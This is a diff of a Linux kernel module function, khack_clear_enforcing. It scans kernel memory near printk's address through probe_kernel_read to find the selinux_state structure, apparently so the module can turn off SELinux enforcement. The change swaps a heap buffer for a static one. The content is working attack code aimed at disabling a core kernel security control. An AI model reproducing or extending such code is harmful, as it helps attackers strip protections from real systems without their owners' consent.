@@ -40,27 +40,23 @@ static int khack_clear_enforcing(void)
 	pkr_fn pkr = (pkr_fn)__symbol_get("probe_kernel_read");
 	unsigned long anchor = (unsigned long)__symbol_get("printk");
 	unsigned long lo, hi, a, hit = 0;
-	u8 *buf;
+	static u8 buf[4096];
 	int found = 0;
 
 	if (!pkr || !anchor)
 		return -EINVAL;
 
-	buf = kmalloc(PAGE_SIZE, GFP_KERNEL);
-	if (!buf)
-		return -ENOMEM;
-
 	anchor &= ~0xFFFUL;
 	lo = anchor - 0x800000UL;
 	hi = anchor + 0x4000000UL;
 
-	for (a = lo; a < hi; a += PAGE_SIZE) {
+	for (a = lo; a < hi; a += sizeof(buf)) {
 		unsigned int i;
 
-		if (pkr(buf, (void *)a, PAGE_SIZE))
+		if (pkr(buf, (void *)a, sizeof(buf)))
 			continue;
 
-		for (i = 0; i + 32 <= PAGE_SIZE; i++) {
+		for (i = 0; i + 32 <= sizeof(buf); i++) {
 			u8 *b = buf + i;
 			u64 avc, ss;
 			int j, ok = 1;
@@ -83,8 +79,6 @@ static int khack_clear_enforcing(void)
 			hit = a + i;
 		}
 	}
-
-	kfree(buf);
 
 	if (found != 1) {
 		pr_info("khack: selinux_state scan found %d candidates\n", found);
